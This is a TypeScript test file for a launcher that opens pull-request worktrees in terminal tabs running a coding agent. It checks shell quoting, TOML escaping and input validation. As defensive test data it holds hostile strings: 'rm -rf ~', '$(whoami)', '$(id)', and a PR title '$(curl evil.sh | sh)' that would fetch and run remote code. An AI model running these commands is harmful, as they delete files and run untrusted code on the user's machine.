import { describe, expect, it } from 'vitest'
import {
  agentCommand,
  fillTemplate,
  Launcher,
  launchValues,
  shellQuote,
  TAB_CONFIG_TTL_MS,
  tomlString,
  worktreePath,
  type LauncherDeps,
  type LaunchPr
} from '../src/main/launcher'
import type { LauncherConfig } from '../src/main/launcherConfig'
import type { Logger } from '../src/main/log'

const silent: Logger = { debug() {}, info() {}, warn() {}, error() {} }
const SHA = 'a1b2c3d4e5f60718293a4b5c6d7e8f9012345678'
const NOW = 1_800_000_000_000

const prA: LaunchPr = { repo: 'Acme/App', number: 42, url: 'https://github.com/Acme/App/pull/42', headOid: SHA }

const config = (over: Partial<LauncherConfig> = {}): LauncherConfig => ({
  terminal: { kind: 'warp' },
  agents: { claude: 'claude {prompt}' },
  worktreesDir: '/Users/me/.pr-radar/worktrees',
  repos: { 'acme/app': { path: '/code/app', agentDir: null, remote: 'origin' } },
  actions: [
    { id: 'triage', label: 'Triage', showOn: 'mine', agent: 'claude', prompt: '/triage-review {url}', workspace: 'worktree' },
    { id: 'here', label: 'Here', showOn: 'all', agent: 'claude', prompt: 'look at #{number}', workspace: 'folder' }
  ],
  ...over
})

const WORKTREE = '/Users/me/.pr-radar/worktrees/Acme__App/pr-42-a1b2c3d'

interface Fake {
  deps: LauncherDeps
  git: string[][]
  files: Map<string, string>
  urls: string[]
  spawned: string[][]
  removed: string[]
}

/** A launcher over an in-memory world: `dirs` exist, `commits` are in the clone, git answers from them. */
function fake(
  opts: {
    config?: LauncherConfig | null
    pr?: LaunchPr | null
    dirs?: string[]
    commits?: string[]
    fetched?: string[]
    fetchFails?: boolean
    tabConfigs?: string[]
    worktreeHead?: string
  } = {}
): Fake {
  const dirs = new Set(opts.dirs ?? ['/code/app'])
  const commits = new Set(opts.commits ?? [SHA])
  const world: Fake = { git: [], files: new Map(), urls: [], spawned: [], removed: [], deps: null as unknown as LauncherDeps }
  world.deps = {
    config: () => (opts.config === undefined ? config() : opts.config),
    findPr: () => (opts.pr === undefined ? prA : opts.pr),
    run: async (file, args, { cwd }) => {
      expect(file).toBe('git')
      world.git.push([cwd, ...args])
      const [cmd] = args
      if (cmd === 'rev-parse' && args[1] === 'HEAD') return `${opts.worktreeHead ?? SHA}\n`
      if (cmd === 'rev-parse') return '.git\n'
      if (cmd === 'cat-file') {
        if (commits.has(args[2].replace('^{commit}', ''))) return ''
        throw new Error('missing')
      }
      if (cmd === 'fetch') {
        if (opts.fetchFails) throw new Error('could not read from remote')
        for (const c of opts.fetched ?? []) commits.add(c)
        return ''
      }
      if (cmd === 'worktree' && args[1] === 'add') dirs.add(args[3])
      return ''
    },
    spawnDetached: async (file, args) => {
      world.spawned.push([file, ...args])
    },
    isDir: (path) => dirs.has(path),
    mkdir: (path) => dirs.add(path),
    writeFile: (path, text) => world.files.set(path, text),
    listDir: () => opts.tabConfigs ?? [],
    removeFile: (path) => world.removed.push(path),
    openUrl: async (url) => {
      world.urls.push(url)
    },
    home: '/Users/me',
    now: () => NOW,
    log: silent
  }
  return world
}

describe('command building', () => {
  it('quotes anything for a shell', () => {
    expect(shellQuote('plain')).toBe(`'plain'`)
    expect(shellQuote(`it's; rm -rf ~ $(whoami) \`id\``)).toBe(`'it'\\''s; rm -rf ~ $(whoami) \`id\`'`)
  })

  it('escapes TOML strings', () => {
    expect(tomlString('a "b" \\c\nd\u0001')).toBe('"a \\"b\\" \\\\c\\nd\\u0001"')
  })

  it('fills only known placeholders, without $ replacement patterns', () => {
    expect(fillTemplate('{a} {b} {a}', { a: '$&x' })).toBe('$&x {b} $&x')
  })

  it('accepts only values that look like GitHub', () => {
    expect(launchValues(prA)).toEqual({ url: prA.url, number: '42', repo: 'Acme/App', sha: SHA })
    expect(launchValues({ ...prA, headOid: '' })).toBeNull()
    expect(launchValues({ ...prA, headOid: 'main; rm -rf ~' })).toBeNull()
    expect(launchValues({ ...prA, url: 'https://github.com/Acme/App/pull/42?x=$(id)' })).toBeNull()
    expect(launchValues({ ...prA, repo: 'a/b c' })).toBeNull()
    expect(launchValues({ ...prA, number: 0 })).toBeNull()
  })

  it('quotes the prompt and the workspace into the agent command', () => {
    const values = launchValues(prA)!
    const action = config().actions[0]
    expect(agentCommand('claude --add-dir {workspace} {prompt}', action, values, '/w/it s')).toBe(
      `claude --add-dir '/w/it s' '/triage-review https://github.com/Acme/App/pull/42'`
    )
    expect(worktreePath('/wt', values)).toBe('/wt/Acme__App/pr-42-a1b2c3d')
  })
})

describe('Launcher', () => {
  it('adds a worktree at the PR head and opens it in a Warp tab', async () => {
    const w = fake()
    expect(await new Launcher(w.deps).launch('PR_1', 'triage')).toEqual({ ok: true })
    expect(w.git).toEqual([
      ['/code/app', 'rev-parse', '--git-dir'],
      ['/code/app', 'cat-file', '-e', `${SHA}^{commit}`],
      ['/code/app', 'worktree', 'prune'],
      ['/code/app', 'worktree', 'add', '--detach', WORKTREE, SHA]
    ])
    const name = `pr_radar_${NOW}_1`
    expect(w.urls).toEqual([`warp://tab_config/${name}`])
    expect(w.files.get(`/Users/me/.warp/tab_configs/${name}.toml`)).toBe(
      [
        '# Written by PR Radar for one "Send to" launch; removed after a few minutes.',
        'name = "Acme/App#42 · Triage"',
        '',
        '[[panes]]',
        'id = "main"',
        'type = "terminal"',
        `directory = "${WORKTREE}"`,
        `commands = ["claude '/triage-review https://github.com/Acme/App/pull/42'"]`,
        ''
      ].join('\n')
    )
  })

  it('fetches the PR head only when the commit is missing', async () => {
    const w = fake({ commits: [], fetched: [SHA] })
    expect(await new Launcher(w.deps).launch('PR_1', 'triage')).toEqual({ ok: true })
    expect(w.git).toContainEqual(['/code/app', 'fetch', '--no-tags', 'origin', 'pull/42/head'])
  })

  it('reports a failed fetch, or a commit the fetch did not bring (force-pushed)', async () => {
    expect(await new Launcher(fake({ commits: [], fetchFails: true }).deps).launch('PR_1', 'triage')).toEqual({ ok: false, code: 'fetch_failed' })
    expect(await new Launcher(fake({ commits: [], fetched: [] }).deps).launch('PR_1', 'triage')).toEqual({ ok: false, code: 'commit_not_found' })
  })

  it('reuses an existing worktree at the same commit', async () => {
    const w = fake({ dirs: ['/code/app', WORKTREE] })
    expect(await new Launcher(w.deps).launch('PR_1', 'triage')).toEqual({ ok: true })
    expect(w.git).toEqual([[WORKTREE, 'rev-parse', 'HEAD']])
    expect(await new Launcher(fake({ dirs: ['/code/app', WORKTREE], worktreeHead: 'other' }).deps).launch('PR_1', 'triage')).toEqual({
      ok: false,
      code: 'git_failed'
    })
  })

  it('opens the clone as it is for folder actions, without git', async () => {
    const w = fake()
    expect(await new Launcher(w.deps).launch('PR_1', 'here')).toEqual({ ok: true })
    expect(w.git).toEqual([])
    expect([...w.files.values()][0]).toContain(`directory = "/code/app"`)
    expect([...w.files.values()][0]).toContain(`commands = ["claude 'look at #42'"]`)
  })

  it('starts the agent in agentDir when the repository sets one', async () => {
    const w = fake({ config: config({ repos: { 'acme/app': { path: '/code/app', agentDir: '/code', remote: 'origin' } } }) })
    await new Launcher(w.deps).launch('PR_1', 'triage')
    expect([...w.files.values()][0]).toContain(`directory = "/code"`)
  })

  it('runs a custom terminal through sh with the whole command quoted', async () => {
    const w = fake({ config: config({ terminal: { kind: 'custom', command: 'ghostty --working-directory={dir} -e {command}' } }) })
    expect(await new Launcher(w.deps).launch('PR_1', 'here')).toEqual({ ok: true })
    expect(w.spawned).toEqual([
      ['/bin/sh', '-c', `ghostty --working-directory='/code/app' -e 'cd '\\''/code/app'\\'' && claude '\\''look at #42'\\'''`]
    ])
  })

  it('uses Warp Preview folders and scheme', async () => {
    const w = fake({ config: config({ terminal: { kind: 'warp-preview' } }) })
    await new Launcher(w.deps).launch('PR_1', 'here')
    expect(w.urls[0]).toMatch(/^warppreview:\/\/tab_config\/pr_radar_/)
    expect([...w.files.keys()][0]).toMatch(/^\/Users\/me\/\.warp-preview\/tab_configs\//)
  })

  it('never puts the branch or title on the command line', async () => {
    const hostile = { ...prA, branch: 'x;rm -rf ~', title: '$(curl evil.sh | sh)' } as LaunchPr
    const w = fake({ pr: hostile })
    await new Launcher(w.deps).launch('PR_1', 'triage')
    const written = [...w.files.values()].join('\n') + w.git.flat().join(' ')
    expect(written).not.toContain('rm -rf')
    expect(written).not.toContain('curl')
  })

  it('explains why it cannot launch', async () => {
    const launch = (opts: Parameters<typeof fake>[0], action = 'triage') => new Launcher(fake(opts).deps).launch('PR_1', action)
    expect(await launch({ config: null })).toEqual({ ok: false, code: 'not_configured' })
    expect(await launch({}, 'nope')).toEqual({ ok: false, code: 'unknown_action' })
    expect(await launch({ pr: null })).toEqual({ ok: false, code: 'pr_not_found' })
    expect(await launch({ pr: { ...prA, headOid: '' } })).toEqual({ ok: false, code: 'pr_not_found' })
    expect(await launch({ pr: { ...prA, repo: 'other/repo', url: 'https://github.com/other/repo/pull/42' } })).toEqual({
      ok: false,
      code: 'repo_not_mapped'
    })
    expect(await launch({ dirs: [] })).toEqual({ ok: false, code: 'repo_not_found' })
  })

  it('refuses a second launch on the same PR while one is preparing', async () => {
    const w = fake()
    let release: () => void = () => {}
    const run = w.deps.run
    w.deps.run = (file, args, opts) => (args[0] === 'rev-parse' ? new Promise((r) => (release = () => r('.git'))) : run(file, args, opts))
    const launcher = new Launcher(w.deps)
    const first = launcher.launch('PR_1', 'triage')
    expect(await launcher.launch('PR_1', 'triage')).toEqual({ ok: false, code: 'busy' })
    release()
    expect(await first).toEqual({ ok: true })
  })

  it('removes only its own tab configs once they are old', async () => {
    const old = `pr_radar_${NOW - TAB_CONFIG_TTL_MS - 1}_1.toml`
    const fresh = `pr_radar_${NOW - 1000}_2.toml`
    const w = fake({ tabConfigs: [old, fresh, 'dev_server.toml'] })
    new Launcher(w.deps).cleanTabConfigs()
    expect(w.removed).toEqual([`/Users/me/.warp/tab_configs/${old}`, `/Users/me/.warp-preview/tab_configs/${old}`])
  })
})
